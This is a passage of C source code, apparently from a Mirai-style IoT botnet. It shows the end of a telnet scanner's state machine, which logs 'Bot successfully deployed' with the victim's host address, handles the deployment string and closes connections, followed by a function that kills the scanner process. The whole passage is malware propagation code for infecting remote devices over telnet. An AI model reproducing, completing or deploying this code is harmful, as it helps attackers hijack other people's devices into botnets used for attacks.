                                        printf("[telnet scan/%d] Bot successfully deployed (Echo) - %s\n", conn->fd, get_victim_host(conn));
                                    #endif
                                    lock_entry(TABLE_DEPLOY_STRING);
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                    continue;
                                }
                                lock_entry(TABLE_DEPLOY_STRING);
                                break;
                            default:
                                consumed = 0;
                                break;
                        }

                        if(consumed == 0)
                        {
                            break;
                        }
                        else
                        {
                            if(consumed > conn->rdbuf_pos)
                            {
                                consumed = conn->rdbuf_pos;
                            }
                            conn->rdbuf_pos -= consumed;
                            memmove(conn->sockbuf, conn->sockbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}


void kill_scanners(void)
{
    kill(tel_pid, 9);
}
